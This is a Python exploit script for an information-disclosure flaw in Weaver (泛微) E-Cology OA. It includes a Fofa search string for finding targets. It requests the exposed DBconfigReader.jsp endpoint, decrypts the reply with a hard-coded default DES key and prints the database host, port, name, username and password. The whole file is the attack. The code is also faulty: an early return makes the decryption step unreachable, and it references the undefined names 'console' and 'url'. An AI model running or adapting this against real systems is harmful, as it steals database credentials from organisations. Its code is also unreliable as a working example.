# -*- coding: utf-8 -*-
# 泛微OA E-Cology 数据库配置信息泄漏
# Fofa:  app="泛微-协同办公OA"

import pyDes
import requests
import sys
import time
from bs4 import BeautifulSoup 

def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25'
}


def desdecode(secret_key, s):
    cipherX = pyDes.des('        ')
    cipherX.setKey(secret_key)
    y = cipherX.decrypt(s)
    return y


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url += 'mobile/DBconfigReader.jsp'
    success_msg = now_time() + '[SUCCESS]'
    shell_msg = now_time() + ''
    warning_msg = now_time() + '[WARNING]不存在泛微OA E-Cology 数据库配置信息泄漏漏洞'
    error_msg = now_time() + '[泛微OA E-Cology 数据库配置信息泄漏漏洞][ERROR]目标请求失败'
    try:
        requests.packages.urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, timeout=10, verify=False)
        if res.status_code != 200:
            return warning_msg
        elif res.status_code == 200:
            return now_time() + " [INFO]可能存在泛微OA E-Cology 数据库配置信息泄漏漏洞"
            res = res.content
            try:
                data = desdecode('1z2x3c4v5b6n', res.strip())
                data = data.strip()
                dbType = str(data).split(';')[0].split(':')[1]
                dbUrl = str(data).split(';')[0].split(':')[2].split('//')[1]
                dbPort = str(data).split(';')[0].split(':')[3]
                dbName = str(data).split(';')[1].split(',')[0].split('=')[1]
                dbUser = str(data).split(';')[1].split(',')[1].split('=')[1]
                dbPass = str(data).split(';')[1].split(',')[2].split('=')[1]
                console.print(now_time() + url +
                      "\n    DBType: {0}\n    DBUrl: {1}\n    DBPort: {2}\n    DBName: {3}\n    DBUser: {4}\n    DBPass: {5}".format(
                          dbType, dbUrl, dbPort, dbName, dbUser, dbPass))
                return 'ok'
            except:
                return  now_time() + " [WARNING]     DES解密失败, 可能默认密钥错误, 手动访问进行确认: {}".format(url)
    except:
        return error_msg


